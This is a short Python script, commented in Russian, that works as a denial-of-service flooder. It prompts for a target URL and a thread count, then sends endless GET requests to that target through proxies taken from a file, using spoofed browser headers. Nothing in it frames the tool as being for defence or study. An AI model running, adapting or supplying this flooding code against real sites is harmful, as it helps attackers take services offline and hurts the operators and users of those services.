import requests
import socket
import threading
import time

ip = input("Куда слать запросы: ")
thr = int(input("Кол-во потоков: "))

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/11020',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'sec-ch-ua-platform': 'FuckYouOS',
    'sec-ch-ua': 'Not A;Brand";v="99", "None";v="98", "Safari";v="84'
    }

file = open('proxy.txt').read().split('\n')

def dos(pro):
    https_proxy = f"http://{pro}"
    proxies = {"https": https_proxy}
    a = 1
    while a==1:
        try:
            resp = requests.get(ip, headers=headers, proxies=proxies) #Я ЛЮБЛЮ АНЮ, СКАЖИ СПАСИБО ЕЙ ЗА ЭТОТ СКРИПТ
            print(f"ip: {resp.text} Результат: {resp.status_code}")
        except:
            print("Неудачное подключение!")
            exit()
    
def thread():
    while file:
        proxy = file[0]
        file.remove(proxy)
        try:
            dos(proxy)
        except Exception as e:
            print("Ошибка:", e)
    
for i in range(thr):
    t = threading.Thread(target=thread)
    t.start()
